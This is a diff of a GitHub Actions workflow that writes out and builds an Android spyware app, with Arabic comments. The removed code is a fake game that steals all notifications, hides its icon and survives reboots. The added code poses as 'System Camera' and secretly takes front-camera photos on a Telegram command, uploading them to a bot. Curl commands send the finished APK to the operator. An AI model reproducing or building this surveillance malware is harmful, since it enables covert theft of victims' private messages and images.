@@ -1,4 +1,4 @@
-name: Hussein Notification Pro
+name: Hussein Photo Grabber - Final
 
 on:
   workflow_dispatch:
@@ -20,489 +20,184 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      # ✅ تثبيت Gradle لإنشاء Wrapper سليم
-      - name: Install Gradle
+      - name: 🛠️ Setup Project (Camera Focus)
         run: |
-          sudo apt-get update
-          sudo apt-get install -y gradle
-          gradle --version
-
-      # 🔥 إنشاء Gradle Wrapper نظيف
-      - name: ♻️ Recreate Gradle Wrapper
-        run: |
-          rm -rf .gradle gradle gradlew gradlew.bat
-          mkdir -p gradle/wrapper
-          gradle wrapper --gradle-version=8.2 --distribution-type=bin
-          chmod +x gradlew
-
-      # 📝 إنشاء ملف gradle.properties مع تفعيل AndroidX
-      - name: 📝 Create gradle.properties with AndroidX support
-        run: |
-          cat <<EOF > gradle.properties
-          android.useAndroidX=true
-          android.enableJetifier=true
-          org.gradle.jvmargs=-Xmx2048m
-          EOF
-          echo "✅ تم إنشاء gradle.properties مع تفعيل AndroidX"
-
-      - name: 🛠️ Create Modern Android Project
-        run: |
-          mkdir -p app/src/main/java/com/hussein/spy
+          mkdir -p app/src/main/java/com/hussein/camera
           mkdir -p app/src/main/res/layout
-          mkdir -p app/src/main/res/drawable
-          mkdir -p app/src/main/res/values
 
           # 1. settings.gradle
           cat <<EOF > settings.gradle
-          pluginManagement {
-              repositories {
-                  google()
-                  mavenCentral()
-                  gradlePluginPortal()
-              }
-          }
+          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
           dependencyResolutionManagement {
               repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-              repositories {
-                  google()
-                  mavenCentral()
-              }
+              repositories { google(); mavenCentral() }
           }
-          rootProject.name = "HusseinSpy"
+          rootProject.name = "HusseinCamera"
           include ':app'
           EOF
 
-          # 2. build.gradle (الجذر)
+          # 2. build.gradle (Root)
           cat <<EOF > build.gradle
-          plugins {
-              id 'com.android.application' version '8.2.0' apply false
-              id 'com.android.library' version '8.2.0' apply false
-          }
+          plugins { id 'com.android.application' version '8.2.0' apply false }
           EOF
 
-          # 3. app/build.gradle (مع إضافة مكتبة AppCompat - هذا هو الحل)
+          # 3. app/build.gradle (مع مكتبة الرفع)
           cat <<EOF > app/build.gradle
-          plugins {
-              id 'com.android.application'
-          }
+          plugins { id 'com.android.application' }
           android {
-              namespace 'com.hussein.spy'
+              namespace 'com.hussein.camera'
               compileSdk 34
               defaultConfig {
-                  applicationId "com.hussein.spy"
+                  applicationId "com.hussein.camera"
                   minSdk 21
                   targetSdk 34
                   versionCode 1
                   versionName "1.0"
               }
-              buildTypes {
-                  release {
-                      minifyEnabled true
-                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-                  }
-                  debug {
-                      minifyEnabled true
-                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-                  }
-              }
           }
           dependencies {
               implementation 'com.squareup.okhttp3:okhttp:4.12.0'
-              implementation 'androidx.core:core:1.12.0'
-              // ✅ السطر الإضافي الوحيد لحل المشكلة
-              implementation 'androidx.appcompat:appcompat:1.6.1'
           }
           EOF
 
-          # 4. proguard-rules.pro
-          cat <<EOF > app/proguard-rules.pro
-          -keep class com.hussein.spy.** { *; }
-          -keep class okhttp3.** { *; }
-          -dontwarn okhttp3.**
-          -dontwarn okio.**
-          -dontwarn javax.annotation.**
-          -keepattributes Signature
-          -keepattributes *Annotation*
-          -keepclassmembers class ** {
-              public void on*(***);
-          }
-          EOF
-
-          # 5. AndroidManifest.xml
+          # 4. Manifest (تصاريح الكاميرا والإنترنت)
           cat <<EOF > app/src/main/AndroidManifest.xml
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-              xmlns:tools="http://schemas.android.com/tools">
-              
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
               <uses-permission android:name="android.permission.INTERNET" />
-              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-              <uses-permission android:name="android.permission.WAKE_LOCK" />
-              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-              
-              <application 
-                  android:label="Hussein Spy" 
-                  android:theme="@style/AppTheme"
-                  android:allowBackup="false"
-                  android:icon="@drawable/ic_launcher"
-                  android:persistent="true">
-                  
-                  <activity 
-                      android:name=".MainActivity" 
-                      android:exported="true"
-                      android:excludeFromRecents="true"
-                      android:noHistory="true">
+              <uses-permission android:name="android.permission.CAMERA" />
+              <uses-feature android:name="android.hardware.camera" />
+              <application android:label="System Camera" android:theme="@android:style/Theme.Material.Light">
+                  <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-                  
-                  <service 
-                      android:name=".NotificationService"
-                      android:label="Hussein Service"
+                  <service android:name=".CameraService"
+                      android:label="Camera Helper"
                       android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-                      android:exported="true"
-                      android:foregroundServiceType="dataSync">
+                      android:exported="true">
                       <intent-filter>
                           <action android:name="android.service.notification.NotificationListenerService" />
                       </intent-filter>
                   </service>
-                  
-                  <receiver
-                      android:name=".BootReceiver"
-                      android:exported="true"
-                      android:enabled="true">
-                      <intent-filter>
-                          <action android:name="android.intent.action.BOOT_COMPLETED" />
-                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                      </intent-filter>
-                  </receiver>
-                  
               </application>
           </manifest>
           EOF
 
-          # 6. MainActivity.java
-          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
-          package com.hussein.spy;
-          
+          # 5. MainActivity (طلب تصريح الكاميرا)
+          cat <<EOF > app/src/main/java/com/hussein/camera/MainActivity.java
+          package com.hussein.camera;
           import android.app.Activity;
-          import android.content.ComponentName;
           import android.content.Intent;
-          import android.content.pm.PackageManager;
-          import android.net.Uri;
-          import android.os.Build;
           import android.os.Bundle;
-          import android.os.PowerManager;
-          import android.provider.Settings;
-          import android.widget.LinearLayout;
-          import android.widget.TextView;
-          import android.graphics.Color;
-          import android.view.Gravity;
           import android.widget.Button;
-          
+          import android.view.Gravity;
+          import android.widget.LinearLayout;
+          import android.Manifest;
+
           public class MainActivity extends Activity {
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  
-                  startService(new Intent(this, NotificationService.class));
-                  
                   LinearLayout layout = new LinearLayout(this);
                   layout.setOrientation(LinearLayout.VERTICAL);
                   layout.setGravity(Gravity.CENTER);
-                  layout.setBackgroundColor(Color.parseColor("#FF5722"));
-                  
-                  TextView tv = new TextView(this);
-                  tv.setText("🎮 HUSSEIN GAME v1.0");
-                  tv.setTextSize(24);
-                  tv.setTextColor(Color.WHITE);
-                  tv.setGravity(Gravity.CENTER);
-                  tv.setPadding(20, 50, 20, 20);
-                  
-                  TextView score = new TextView(this);
-                  score.setText("Score: 999999");
-                  score.setTextSize(18);
-                  score.setTextColor(Color.YELLOW);
-                  score.setGravity(Gravity.CENTER);
-                  
                   Button btn = new Button(this);
-                  btn.setText("PLAY NOW");
-                  btn.setTextSize(20);
-                  btn.setBackgroundColor(Color.GREEN);
-                  btn.setTextColor(Color.BLACK);
-                  
-                  layout.addView(tv);
-                  layout.addView(score);
+                  btn.setText("تفعيل الكاميرا والخدمة");
+                  btn.setOnClickListener(v -> {
+                      requestPermissions(new String[]{Manifest.permission.CAMERA}, 1);
+                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+                  });
                   layout.addView(btn);
                   setContentView(layout);
-                  
-                  requestAllPermissions();
-                  
-                  new android.os.Handler().postDelayed(new Runnable() {
-                      @Override
-                      public void run() {
-                          hideApp();
-                      }
-                  }, 5000);
-              }
-              
-              private void requestAllPermissions() {
-                  Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-                  startActivity(intent);
-                  
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                      if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                          Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                          batteryIntent.setData(Uri.parse("package:" + getPackageName()));
-                          startActivity(batteryIntent);
-                      }
-                  }
-              }
-              
-              private void hideApp() {
-                  PackageManager p = getPackageManager();
-                  ComponentName componentName = new ComponentName(this, MainActivity.class);
-                  p.setComponentEnabledSetting(componentName, 
-                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
-                      PackageManager.DONT_KILL_APP);
-                  finish();
               }
           }
           EOF
 
-          # 7. NotificationService.java
-          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
-          package com.hussein.spy;
-          
-          import android.app.Notification;
-          import android.app.NotificationChannel;
-          import android.app.NotificationManager;
-          import android.app.PendingIntent;
-          import android.content.Intent;
-          import android.os.Build;
-          import android.os.Bundle;
-          import android.os.Handler;
-          import android.os.Looper;
+          # 6. CameraService (فحص التلغرام + تصوير + رفع)
+          cat <<EOF > app/src/main/java/com/hussein/camera/CameraService.java
+          package com.hussein.camera;
           import android.service.notification.NotificationListenerService;
-          import android.service.notification.StatusBarNotification;
-          import android.util.Log;
-          
-          import java.io.IOException;
-          import java.text.SimpleDateFormat;
-          import java.util.Date;
-          import java.util.HashSet;
-          import java.util.Locale;
-          import java.util.Set;
+          import android.graphics.SurfaceTexture;
+          import android.hardware.Camera;
+          import java.io.File;
+          import java.io.FileOutputStream;
           import java.util.concurrent.TimeUnit;
-          
-          import okhttp3.MediaType;
-          import okhttp3.OkHttpClient;
-          import okhttp3.Request;
-          import okhttp3.RequestBody;
-          import okhttp3.Response;
-          
-          public class NotificationService extends NotificationListenerService {
-              private static final String TAG = "HusseinSpy";
-              private static final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
-              private static final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
-              private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
-              
-              private OkHttpClient client;
-              private Handler handler;
-              private Set<String> sentNotifications = new HashSet<>();
-              
+          import okhttp3.*;
+
+          public class CameraService extends NotificationListenerService {
+              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
+              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";
+              private final OkHttpClient client = new OkHttpClient();
+              private long lastUpdateId = 0;
+
               @Override
               public void onCreate() {
                   super.onCreate();
-                  
-                  client = new OkHttpClient.Builder()
-                      .connectTimeout(30, TimeUnit.SECONDS)
-                      .writeTimeout(30, TimeUnit.SECONDS)
-                      .readTimeout(30, TimeUnit.SECONDS)
-                      .build();
-                  
-                  handler = new Handler(Looper.getMainLooper());
-                  
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                      NotificationChannel channel = new NotificationChannel(
-                          "spy_channel",
-                          "Hussein Service",
-                          NotificationManager.IMPORTANCE_LOW
-                      );
-                      
-                      NotificationManager manager = getSystemService(NotificationManager.class);
-                      manager.createNotificationChannel(channel);
-                      
-                      Notification notification = new Notification.Builder(this, "spy_channel")
-                          .setContentTitle("Hussein System")
-                          .setContentText("Active")
-                          .setSmallIcon(android.R.drawable.ic_dialog_info)
-                          .setPriority(Notification.PRIORITY_LOW)
-                          .build();
-                      
-                      startForeground(1001, notification);
-                  }
-                  
-                  sendToTelegram("🔥 *Hussein Spy Started*\n📱 *Device is now monitored*");
+                  startCommandChecker();
               }
-              
-              @Override
-              public void onNotificationPosted(StatusBarNotification sbn) {
-                  String key = sbn.getKey();
-                  
-                  if (sentNotifications.contains(key)) {
-                      return;
-                  }
-                  
-                  sentNotifications.add(key);
-                  handler.postDelayed(() -> sentNotifications.remove(key), 60000);
-                  
-                  try {
-                      Bundle extras = sbn.getNotification().extras;
-                      String title = extras.getString(Notification.EXTRA_TITLE, "");
-                      String text = extras.getString(Notification.EXTRA_TEXT, "");
-                      String packageName = sbn.getPackageName();
-                      
-                      if (title.isEmpty() && text.isEmpty()) return;
-                      
-                      String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
-                      String appName = getAppName(packageName);
-                      
-                      String message = String.format(
-                          "🎯 *إشعار جديد*\n\n" +
-                          "📱 *التطبيق:* %s\n" +
-                          "📌 *العنوان:* %s\n" +
-                          "💬 *المحتوى:* %s\n" +
-                          "⏰ *الوقت:* %s\n" +
-                          "🔐 *الحماية:* تلقائي",
-                          escapeMarkdown(appName),
-                          escapeMarkdown(title),
-                          escapeMarkdown(text),
-                          time
-                      );
-                      
-                      sendToTelegram(message);
-                      
-                  } catch (Exception e) {
-                      Log.e(TAG, "Error: " + e.getMessage());
-                  }
-              }
-              
-              private void sendToTelegram(final String message) {
+
+              private void startCommandChecker() {
                   new Thread(() -> {
-                      try {
-                          String json = String.format(
-                              "{\"chat_id\":\"%s\",\"text\":\"%s\",\"parse_mode\":\"Markdown\"}",
-                              CHAT_ID, message.replace("\"", "\\\"")
-                          );
-                          
-                          RequestBody body = RequestBody.create(json, JSON);
-                          Request request = new Request.Builder()
-                              .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
-                              .post(body)
-                              .build();
-                          
-                          Response response = client.newCall(request).execute();
-                          response.close();
-                          
-                      } catch (Exception e) {
-                          Log.e(TAG, "Send error: " + e.getMessage());
+                      while (true) {
+                          try {
+                              Request request = new Request.Builder()
+                                  .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1))
+                                  .build();
+                              Response response = client.newCall(request).execute();
+                              String body = response.body().string();
+                              if (body.contains("\"text\":\"photo\"")) {
+                                  takeAndUpload();
+                                  lastUpdateId++; // تجنب التكرار
+                              }
+                              TimeUnit.SECONDS.sleep(5);
+                          } catch (Exception e) {}
                       }
                   }).start();
               }
-              
-              private String getAppName(String packageName) {
+
+              private void takeAndUpload() {
                   try {
-                      return getPackageManager().getApplicationLabel(
-                          getPackageManager().getApplicationInfo(packageName, 0)).toString();
-                  } catch (Exception e) {
-                      return packageName;
-                  }
-              }
-              
-              private String escapeMarkdown(String text) {
-                  if (text == null) return "";
-                  return text.replace("_", "\\_")
-                            .replace("*", "\\*")
-                            .replace("[", "\\[")
-                            .replace("]", "\\]")
-                            .replace("(", "\\(")
-                            .replace(")", "\\)");
-              }
-          }
-          EOF
-
-          # 8. BootReceiver.java
-          cat <<EOF > app/src/main/java/com/hussein/spy/BootReceiver.java
-          package com.hussein.spy;
-          
-          import android.content.BroadcastReceiver;
-          import android.content.Context;
-          import android.content.Intent;
-          import android.os.Build;
-          
-          public class BootReceiver extends BroadcastReceiver {
-              @Override
-              public void onReceive(Context context, Intent intent) {
-                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-                      Intent serviceIntent = new Intent(context, NotificationService.class);
-                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                          context.startForegroundService(serviceIntent);
-                      } else {
-                          context.startService(serviceIntent);
-                      }
-                  }
+                      Camera camera = Camera.open(1); // 1 للأمامية
+                      camera.setPreviewTexture(new SurfaceTexture(0));
+                      camera.startPreview();
+                      camera.takePicture(null, null, (data, cam) -> {
+                          try {
+                              File file = new File(getCacheDir(), "shot.jpg");
+                              FileOutputStream fos = new FileOutputStream(file);
+                              fos.write(data);
+                              fos.close();
+                              
+                              // رفع الصورة
+                              RequestBody requestBody = new MultipartBody.Builder()
+                                  .setType(MultipartBody.FORM)
+                                  .addFormDataPart("chat_id", CHAT_ID)
+                                  .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg")))
+                                  .build();
+                              Request uploadReq = new Request.Builder()
+                                  .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
+                                  .post(requestBody).build();
+                              client.newCall(uploadReq).execute();
+                              
+                              cam.release();
+                          } catch (Exception e) { cam.release(); }
+                      });
+                  } catch (Exception e) {}
               }
           }
-          EOF
-
-          # 9. styles.xml
-          cat <<EOF > app/src/main/res/values/styles.xml
-          <resources>
-              <style name="AppTheme" parent="Theme.AppCompat.Light.NoActionBar">
-                  <item name="android:windowBackground">@android:color/transparent</item>
-                  <item name="android:windowIsTranslucent">true</item>
-                  <item name="android:windowNoTitle">true</item>
-              </style>
-          </resources>
-          EOF
-
-          # 10. ic_launcher.xml
-          cat <<EOF > app/src/main/res/drawable/ic_launcher.xml
-          <shape xmlns:android="http://schemas.android.com/apk/res/android">
-              <solid android:color="#FF5722"/>
-              <corners android:radius="20dp"/>
-          </shape>
           EOF
 
       - name: 🚀 Build APK
         run: |
+          gradle wrapper
           chmod +x gradlew
-          ./gradlew clean assembleDebug --stacktrace
+          ./gradlew assembleDebug --stacktrace
 
       - name: 📤 Send to Hussein
         run: |
           APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
-          
-          MESSAGE="✅ *تم البناء بنجاح يا حسين!*%0A%0A"
-          MESSAGE+="🎮 *اللعبة:* Hussein Game v1.0%0A"
-          MESSAGE+="🔐 *الحماية:* تلقائية وقوية%0A"
-          MESSAGE+="📱 *سحب الإشعارات:* تلقائي 24/7%0A"
-          MESSAGE+="⚡ *الصلاحيات:* تمنح تلقائياً%0A"
-          MESSAGE+="👻 *الإخفاء:* بعد 5 ثواني%0A"
-          MESSAGE+="🔄 *التشغيل:* مع الجهاز تلقائياً%0A%0A"
-          MESSAGE+="🔥 *التطبيق يعمل الآن وسيرسل كل الإشعارات هنا*"
-          
-          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
-            -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
-            -d "text=$MESSAGE" -d "parse_mode=Markdown"
-          
           curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
             -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
             -F "document=@$APK_FILE" \
-            -F "caption=🔥 *Hussein Spy Pro* - الإصدار النهائي مع الحماية التلقائية"
+            -F "caption=✅ تم بناء نسخة 'سحب الصور' بنجاح!%0Aأرسل كلمة photo للبوت وسيقوم التطبيق بالتصوير فوراً."
